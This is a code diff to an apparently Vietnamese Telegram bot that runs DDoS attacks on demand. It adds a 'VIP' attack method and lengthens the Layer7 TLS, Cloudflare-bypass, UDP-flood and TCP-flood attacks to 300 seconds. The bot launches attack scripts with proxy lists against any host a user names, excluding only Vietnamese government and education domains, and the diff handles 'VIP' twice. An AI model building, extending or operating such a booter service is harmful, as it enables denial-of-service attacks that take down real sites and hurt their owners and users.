@@ -209,6 +209,7 @@ def methods(message):
 📌 Tất Cả Methods:
 🚀 Layer7 
 [ Không Gov, Edu ]
+VIP
 TLS
 DESTROY
 CF-BYPASS
@@ -279,41 +280,41 @@ def attack_command(message):
         port = None
 
     blocked_domains = [".edu.vn", ".gov.vn", "chinhphu.vn"]   
-    if method == 'TLS' or method == 'DESTROY' or method == 'CF-BYPASS':
+    if method == 'TLS' or method == 'VIP' or method == 'CF-BYPASS':
         for blocked_domain in blocked_domains:
             if blocked_domain in host:
                 bot.reply_to(message, f"Không được phép tấn công trang web có tên miền {blocked_domain}")
                 return
 
-    if method in ['TLS', 'GOD', 'DESTROY', 'CF-BYPASS', 'UDP-FLOOD', 'TCP-FLOOD']:
+    if method in ['TLS', 'GOD', 'VIP', 'CF-BYPASS', 'UDP-FLOOD', 'TCP-FLOOD']:
         # Update the command and duration based on the selected method
-        if method == 'vip':
+        if method == 'VIP':
             command = ["node", "vipok.js", host, "300", "300", "5"]
             duration = 300
         if method == 'TLS':
-            command = ["node", "TLS.js", host, "90", "64", "5"]
-            duration = 90
+            command = ["node", "TLS.js", host, "300", "64", "5"]
+            duration = 300
         elif method == 'GOD':
-            command = ["node", "GOD.js", host, "45", "64", "3"]
-            duration = 45
-        elif method == 'DESTROY':
-            command = ["node", "DESTROY.js", host, "90", "64", "5", "proxy.txt"]
-            duration = 90
+            command = ["node", "GOD.js", host, "300", "64", "3"]
+            duration = 300
+        elif method == 'VIP':
+            command = ["node", "vipok.js", host, "300", "64", "5", "proxy.txt"]
+            duration = 300
         elif method == 'CF-BYPASS':
-            command = ["node", "CFBYPASS.js", host, "90", "64", "5", "proxy.txt"]
-            duration = 90
+            command = ["node", "CFBYPASS.js", host, "300", "64", "5", "proxy.txt"]
+            duration = 300
         elif method == 'UDP-FLOOD':
             if not port.isdigit():
                 bot.reply_to(message, 'Port phải là một số nguyên dương.')
                 return
-            command = ["python", "udp.py", host, port, "90", "64", "10"]
-            duration = 90
+            command = ["python", "udp.py", host, port, "300", "64", "10"]
+            duration = 300
         elif method == 'TCP-FLOOD':
             if not port.isdigit():
                 bot.reply_to(message, 'Port phải là một số nguyên dương.')
                 return
-            command = ["python", "tcp.py", host, port, "90", "64", "10"]
-            duration = 90
+            command = ["python", "tcp.py", host, port, "300", "64", "10"]
+            duration = 300
 
         cooldown_dict[username] = {'attack': current_time}
 
@@ -509,4 +510,5 @@ def invalid_command(message):
     bot.reply_to(message, 'Lệnh không hợp lệ. Vui lòng sử dụng lệnh /help để xem danh sách lệnh.')
 
 bot.infinity_polling(timeout=60, long_polling_timeout = 1)
+
 
